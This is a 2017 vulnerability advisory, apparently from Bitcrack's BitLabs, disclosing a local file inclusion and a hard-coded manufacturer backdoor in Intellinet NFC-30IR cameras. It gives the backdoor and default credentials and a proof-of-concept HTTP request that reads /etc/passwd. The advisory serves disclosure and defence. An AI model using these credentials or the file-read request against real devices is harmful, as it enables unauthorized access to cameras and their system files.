@@ -1,0 +1,118 @@
+Bitcrack Cyber Security - BitLabs Advisory
+http://www.bitcrack.net
+ 
+Multiple Vulnerabilities in Intellinet NFC-30IR Network Cameras
+ 
+ 
+ADVISORY
+--------
+ 
+Title: Local File Inclusion in CGI-SCRIPT & Hard-Coded Manufacturer Backdoor
+Advisory ID: BITL-17-001
+Date published: 2017-04-05
+Date of last update: 2017-04-05
+Vendors contacted: Intellinet
+ 
+VULNERABILITY
+-------------
+ 
+Type: Local File Inclusion (LFI)(Authenticated) & Hardcoded Manufacturer Backdoor
+Risk/Impact: Access to sensitive files & Access control bypass.
+Exploitation Type : Remote
+CVE Name: CVE-2017-7461 and CVE-2017-7462
+
+DESCRIPTION
+------------
+ 
+We found two vulnerabilities affecting the Intellinet NFC-30IR Camera with
+firmware version LM.1.6.16.05
+ 
+   1. [CVE-2017-7461] once authenticated as admin:admin, you can read local files 
+   by requesting the '/cgi-bin/admin/fileread?READ.filePath=<insert here>'
+   
+   Instead of the developer using server-side scripts to render information, it takes the 
+   plain text files and uses /fileread CGI script to simply return the plain text - the 
+   site then relies on Javascript to "format" the text into something pretty.
+   
+   There is no sanitization nor lock-down of what paths that script can read, hence all
+   files can be viewed. Interesting files to request are; /etc/passwd; /etc/boa.conf and more.
+   
+
+   2. [CVE-2017-7462] a manufacturer backdoor exists that allows one to access a script
+   called '/cgi-bin/mft/manufacture' by authenticating as manufacture:erutcafunam 
+   
+   This binary has been analyzed before by other vendors. We did not analyze it again as we 
+   feel this is the same file used in other cameras. Note that the NFC-30IR does NOT have the
+   wireless_mft executable. 
+
+	The hard-coded manufacturer user:pass is manufacture:erutcafunam as shown in the 
+	below boa.conf snippet;
+	/----
+	--snip--
+	#ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
+	ScriptAlias /cgi-bin/operator/ /opt/cgi/operator/
+	ScriptAlias /cgi-bin/view/ /opt/cgi/view/ 
+	ScriptAlias /cgi-bin/admin/ /opt/cgi/admin/
+	ScriptAlias /cgi-bin/jpg/ /opt/cgi/jpg/
+	ScriptAlias /cgi-bin/ /opt/cgi/
+	ScriptAlias /jpg /opt/cgi/jpg
+
+	# MFT: Specify manufacture commands user name and password
+	MFT manufacture erutcafunam
+	
+	--snip--
+	----/
+	
+	This indicates that the camera hardware may be some kind of modified/stripped version
+	of a Zavio board.
+ 
+VENDOR RESPONSE/NOTIFICATION
+----------------------------
+ 
+Vendor was given 7 days to respond, and 3 written notifications.
+No response received nor acknowledgement. 
+Vendor has not released updates to fix the vulnerabilities.
+ 
+CREDITS
+-------
+ 
+Vulnerabilities discovered by Dimitri Fousekis/RuraPenthe
+Additional information on how the manufacture CGI executable works was obtained by
+information written by Core Security/Francisco Falcon.
+ 
+PROOF OF CONCEPT CODE
+----------------------
+
+LOCAL FILE INCLUSION THROUGH CGI FILE READER
+/-----
+GET /cgi-bin/admin/fileread?READ.filePath=/etc/passwd HTTP/1.1
+Host: 10.0.0.21
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT
+Referer: http://10.0.0.21/system_info.htm
+Cookie: VideoFmt=3
+Authorization: Basic YWRtaW46YWRtaW4=
+Connection: close
+-----/
+ 
+ABOUT BITLABS
+-------------
+ 
+BitLabs is the research division of Bitcrack Cyber Security, a South African & Mauritian
+based cyber security company. We specialize in providing our clients with research and 
+information to combat current and future attacks on their systems and devices. 
+BitLabs focuses primarily on IoT device research, identifying vulnerabilities and other 
+attack vectors that can impact users of these devices negatively. 
+Our Web address is at : http://www.bitcrack.net 
+
+DISCLAIMER INFO
+---------------
+ 
+All content of this advisory is Copyright (C) 2017 Bitcrack Cyber Security,
+and are licensed under a Creative Commons Attribution Non-Commercial 3.0
+(South Africa) License: http://za.creativecommons.org/ and other countries as and when
+stipulated.
+ 
